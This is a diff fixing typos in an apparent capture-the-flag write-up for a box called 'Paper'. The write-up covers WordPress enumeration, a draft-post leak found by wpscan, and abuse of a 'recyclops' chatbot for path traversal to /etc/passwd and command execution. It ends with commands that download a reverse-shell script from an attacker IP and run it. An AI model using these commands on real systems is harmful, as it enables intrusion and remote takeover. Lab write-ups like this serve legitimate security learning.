@@ -7,8 +7,8 @@
 2. Found HTTP header `X-Backend-Server: office.paper`, so set `office.paper` as hostname in `/etc/hosts`. Then visit `office.paper`.
 3. Wordpress users: `nick`, `Prisonmike`
 3. `/index.php/wp-json/` is the API endpoint of Wordpress, worth to take a look.
-4. See some pages that not shown on `http://office.paper/index.php/wp-json/wp/v2/pages` by examing the API.
-5. From the hint in the publiched posts and the result of `wpscan`, I found this vuln leak the draft by visiting `http://office.paper/?static=1`. And it reveals a chat service register page.
+4. See some pages that not shown on `http://office.paper/index.php/wp-json/wp/v2/pages` by examining the API.
+5. From the hint in the published posts and the result of `wpscan`, I found this vuln leak the draft by visiting `http://office.paper/?static=1`. And it reveals a chat service register page.
 ```
 $ cat wordpress/wpscan-api.out
  | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
@@ -25,7 +25,7 @@ $ curl http://office.paper/?static=1
 <p>http://chat.office.paper/register/8qozr226AhkCHZdyY</p>
 ```
 6. From the conversation in the chat, we can send `recyclops file ../../../../../../../../../etc/passwd` to read files on the box, use `recyclops list ..` for `ls`
-7. Use `recyclops run {cat,/etc/passwd}' to execute command.
+7. Use `recyclops run {cat,/etc/passwd}` to execute command.
 ```
 recyclops run {wget,10.10.17.233:8000/rev.sh}
 recyclops run {sh,./rev.sh}
